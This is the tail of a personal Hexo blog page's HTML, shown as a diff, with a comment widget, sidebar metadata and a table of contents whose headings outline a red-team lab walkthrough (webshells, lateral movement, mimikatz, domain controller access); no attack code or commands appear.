+    <a href="/2024/09/27/ATT&CK红队评估实战靶场-1/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-10-05 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>4</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Vulnstack靶场/">Vulnstack靶场<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA"><span class="toc-article-text">网络搭建</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">信息搜集</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99%E9%A9%AC"><span class="toc-article-text">尝试数据库写马</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95%E7%A0%B4%E8%A7%A3%E5%93%88%E5%B8%8C"><span class="toc-article-text">尝试破解哈希</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%94%A8%E6%88%B7"><span class="toc-article-text">尝试添加新用户</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Joomla-%E5%90%8E%E5%8F%B0%E4%B8%BB%E9%A2%98%E5%86%99%E9%A9%AC"><span class="toc-article-text">Joomla!后台主题写马</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#disabled-function%E7%BB%95%E8%BF%87"><span class="toc-article-text">disabled_function绕过</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%88%B0%E7%94%A8%E6%88%B7"><span class="toc-article-text">权限提升到用户</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#93%E7%BD%91%E6%AE%B5%E6%8E%A2%E6%B5%8B"><span class="toc-article-text">93网段探测</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#fscan%E5%86%85%E7%BD%91%E5%A4%A7%E4%BF%9D%E5%81%A5"><span class="toc-article-text">fscan内网大保健</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#ew%E6%90%AD%E5%BB%BAsocks5%E4%BB%A3%E7%90%86"><span class="toc-article-text">ew搭建socks5代理</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#120%E5%A4%87%E4%BB%BD%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-article-text">120备份服务器</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-article-text">域渗透</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-article-text">尝试永恒之蓝</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="toc-article-text">信息搜集</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#smb%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-article-text">smb弱口令爆破</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#psexec-%E6%8B%BF%E4%B8%8Bwin7%E3%80%81win2008"><span class="toc-article-text">psexec 拿下win7、win2008</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-article-text">mimikatz抓取密码</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%99%BB%E5%BD%95%E5%9F%9F%E6%8E%A7"><span class="toc-article-text">登录域控</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
